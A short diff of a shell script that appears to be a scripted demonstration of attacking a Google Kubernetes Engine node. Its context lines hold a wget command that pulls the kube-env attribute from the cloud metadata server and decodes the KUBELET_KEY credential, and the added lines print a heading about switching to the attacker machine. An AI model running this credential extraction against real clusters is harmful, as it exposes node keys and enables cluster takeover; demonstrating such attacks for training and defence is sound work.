@@ -42,3 +42,9 @@ echo ""
 echo ""
 p "${CYAN}KUBELET_KEY${COLOR_RESET}"
 wget -qO- http://metadata.google.internal/computeMetadata/v1beta1/instance/attributes/kube-env | grep KUBELET_KEY | sed s'/KUBELET_KEY: //g' | base64 -d
+
+echo ""
+echo ""
+echo ""
+p "${CYAN}# Switch to attacker machine"
+
